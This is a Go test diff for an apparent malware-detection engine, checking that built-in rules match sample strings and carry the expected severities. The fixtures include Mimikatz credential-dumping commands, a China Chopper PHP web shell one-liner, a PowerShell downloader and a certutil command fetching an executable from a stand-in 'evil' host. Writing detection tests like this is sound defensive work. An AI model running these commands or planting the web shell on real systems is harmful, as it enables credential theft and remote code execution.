@@ -172,6 +172,44 @@ func TestBuiltinRuleSeverities(t *testing.T) {
 	}
 }
 
+func TestExpandedBuiltinRules(t *testing.T) {
+	e := NewEngine()
+	cases := []struct{ rule, data string }{
+		{"TOOL_Mimikatz", "privilege::debug\nsekurlsa::logonpasswords full"},
+		{"TOOL_LaZagne", "running lazagne all -oN"},
+		{"TOOL_Chisel_Tunnel", "github.com/jpillora/chisel/server"},
+		{"TOOL_Sliver_Implant", "registered sliverpb.Envelope handler"},
+		{"MAL_AsyncRAT", "AsyncClient.exe connected"},
+		{"MAL_njRAT", "njRAT v0.7d stub"},
+		{"WEBSHELL_ChinaChopper", `<?php @eval($_POST['pass']);?>`},
+		{"WEBSHELL_b374k", "b374k 3.2.3 php shell"},
+		{"SCRIPT_PowerShell_Downloader", "$c=New-Object Net.WebClient; $c.DownloadString('http://x/a')"},
+		{"SCRIPT_LOLBIN_Download", "certutil -urlcache -split -f http://evil/x.exe"},
+		{"PACKER_VMProtect", "section .vmp0 .vmp1 added by VMProtect"},
+		{"MINER_Generic_Stratum", "pool stratum+tcp://xmr.pool:4444"},
+		{"LINUX_Diamorphine_Rootkit", "diamorphine module_hide give_root"},
+	}
+	for _, c := range cases {
+		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
+			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
+		}
+	}
+	// Packer rules are severity=medium; malware/tool rules stay critical.
+	rules := map[string]string{}
+	for _, r := range e.rules {
+		rules[r.Name] = MatchSeverity(Match{Meta: r.Meta})
+	}
+	if rules["PACKER_VMProtect"] != "medium" {
+		t.Errorf("PACKER_VMProtect severity = %q, want medium", rules["PACKER_VMProtect"])
+	}
+	if rules["TOOL_Chisel_Tunnel"] != "high" {
+		t.Errorf("TOOL_Chisel_Tunnel severity = %q, want high", rules["TOOL_Chisel_Tunnel"])
+	}
+	if rules["TOOL_Mimikatz"] != "critical" {
+		t.Errorf("TOOL_Mimikatz severity = %q, want critical (default)", rules["TOOL_Mimikatz"])
+	}
+}
+
 func TestBuiltinModuleInjectionRule(t *testing.T) {
 	// The injection triad is a PE-only rule: it must not fire on a non-PE that
 	// merely mentions the API names as text (the module reads real imports).
